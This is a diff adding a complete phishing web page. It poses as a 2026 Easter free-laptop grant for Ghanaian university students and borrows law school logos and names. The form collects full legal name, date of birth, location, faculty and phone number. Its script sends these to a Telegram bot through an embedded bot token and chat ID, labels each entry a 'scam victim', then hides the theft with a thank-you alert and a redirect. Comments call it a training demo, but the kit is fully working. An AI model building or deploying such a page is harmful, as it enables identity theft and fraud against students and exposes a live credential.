@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2026 Easter Student Laptop Grant</title>
+    <style>
+        :root {
+            --primary: #4a90e2;
+            --secondary: #f39c12;
+            --bg: #f8f9fa;
+            --text: #333;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-image: radial-gradient(circle at top right, #ffe6e6, transparent 40%),
+                              radial-gradient(circle at bottom left, #e6f2ff, transparent 40%);
+        }
+        .container {
+            background: #fff;
+            width: 100%;
+            max-width: 500px;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.1);
+            overflow: hidden;
+            margin: 20px;
+        }
+        /* --- Training Logo Styles --- */
+        .institutional-logos {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            padding: 15px 20px;
+            background: #ffffff;
+            border-bottom: 2px solid #eee;
+        }
+        .logo-img {
+            max-height: 90px;
+            max-width: 160px;
+            object-fit: contain;
+        }
+        /* --------------------------------- */
+        .header {
+            background: var(--primary);
+            color: white;
+            padding: 25px 20px;
+            text-align: center;
+            position: relative;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+        .header p {
+            margin: 10px 0 0;
+            font-size: 15px;
+            opacity: 0.9;
+        }
+        .badge {
+            background: var(--secondary);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+        .content {
+            padding: 30px;
+        }
+        .urgency {
+            background: #fff3cd;
+            color: #856404;
+            padding: 12px;
+            border-radius: 6px;
+            border-left: 4px solid #ffeeba;
+            font-size: 14px;
+            margin-bottom: 25px;
+            text-align: center;
+            font-weight: bold;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--text);
+            font-size: 14px;
+        }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+        .form-group input:focus, .form-group select:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.1);
+        }
+        .submit-btn {
+            background: var(--secondary);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+        .submit-btn:hover {
+            background: #e67e22;
+        }
+        .submit-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .footer {
+            text-align: center;
+            padding: 15px;
+            font-size: 11px;
+            color: #888;
+            background: #fdfdfd;
+            border-top: 1px solid #eee;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Training Asset Logos -->
+    <div class="institutional-logos">
+        <img src="law2.jpg" alt="University of Ghana School of Law" class="logo-img">
+        <img src="lawlogo.png" alt="Ghana School of Law SRC" class="logo-img">
+    </div>
+
+    <div class="header">
+        <div class="badge">🐰 Easter Promo 2026</div>
+        <h1>Student Laptop Grant Program</h1>
+        <p>Register to claim your free educational laptop. Open to all faculties.</p>
+    </div>
+    
+    <div class="content">
+        <div class="urgency">
+            ⏳ Only 47 Laptops Remaining! Registration closes soon.
+        </div>
+        
+        <!-- Form submission hijacked by JavaScript for live demonstration -->
+        <form id="giveawayForm" onsubmit="submitScamForm(event)">
+            <div class="form-group">
+                <label for="fullName">Full Legal Name (As it appears on ID)</label>
+                <input type="text" id="fullName" name="fullName" required placeholder="e.g., John Doe">
+            </div>
+            
+            <div class="form-group">
+                <label for="dob">Date of Birth</label>
+                <input type="date" id="dob" name="dob" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="location">Current City / Location</label>
+                <input type="text" id="location" name="location" required placeholder="e.g., Accra">
+            </div>
+            
+            <div class="form-group">
+                <label for="faculty">Faculty / Department</label>
+                <select id="faculty" name="faculty" required>
+                    <option value="" disabled selected>Select your faculty...</option>
+                    <option value="Law">Faculty of Law</option>
+                    <option value="Business">Business School</option>
+                    <option value="Engineering">Engineering</option>
+                    <option value="Arts">Arts & Humanities</option>
+                    <option value="Science">Sciences</option>
+                    <option value="Other">Other</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="phone">Phone Number (For Delivery)</label>
+                <input type="tel" id="phone" name="phone" required placeholder="050 000 0000">
+            </div>
+
+            <button type="submit" id="submitBtn" class="submit-btn">Claim My Laptop Now</button>
+        </form>
+    </div>
+    <div class="footer">
+        © 2026 University Support Initiative. Terms and conditions apply. <br>
+        Delivery fees may apply upon dispatch.
+    </div>
+</div>
+
+<script>
+    // --- TELEGRAM CLIENT-SIDE EXFILTRATION LOGIC (For Training Demo) ---
+    const TELEGRAM_BOT_TOKEN = '8287282426:AAH1IwO0-0S5hlb6llzrSyr93ATQaQAiqsM'; 
+    const TELEGRAM_CHAT_ID = '1224233010'; 
+    
+    // HTML Escaping Function to prevent Telegram 400 Bad Request errors from special characters
+    function escapeHTML(str) {
+        return str
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#039;');
+    }
+
+    async function submitScamForm(event) {
+        // Prevent default form submission (page reload)
+        event.preventDefault();
+
+        // UI Feedback: Disable button and show loading state
+        const btn = document.getElementById('submitBtn');
+        const originalText = btn.innerText;
+        btn.innerText = 'Processing Application...';
+        btn.disabled = true;
+
+        // Harvest PII Data from the DOM
+        const fullName = document.getElementById('fullName').value.trim();
+        const dob = document.getElementById('dob').value.trim();
+        const location = document.getElementById('location').value.trim();
+        const faculty = document.getElementById('faculty').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+
+        // Construct the Exfiltration Payload
+        const message = `🚨 <b>NEW SCAM VICTIM (Giveaway Demo)</b> 🚨\n\n` +
+                        `👤 <b>Name:</b> ${escapeHTML(fullName)}\n` +
+                        `📅 <b>DOB:</b> ${escapeHTML(dob)}\n` +
+                        `📍 <b>Location:</b> ${escapeHTML(location)}\n` +
+                        `🏫 <b>Faculty:</b> ${escapeHTML(faculty)}\n` +
+                        `📱 <b>Phone:</b> ${escapeHTML(phone)}`;
+
+        try {
+            // Fire the data to Telegram via their public API
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML' 
+                })
+            });
+            
+            // Execute the deceptive redirect typical of these scams
+            setTimeout(() => {
+                alert('Thank you! Your application for the laptop grant is being processed. You will be contacted shortly.');
+                window.location.href = 'https://google.com';
+            }, 800);
+
+        } catch (error) {
+            console.error('Exfiltration failed:', error);
+            // Restore button if there's a network error
+            btn.innerText = originalText;
+            btn.disabled = false;
+        }
+    }
+</script>
+
+</body>
+</html>
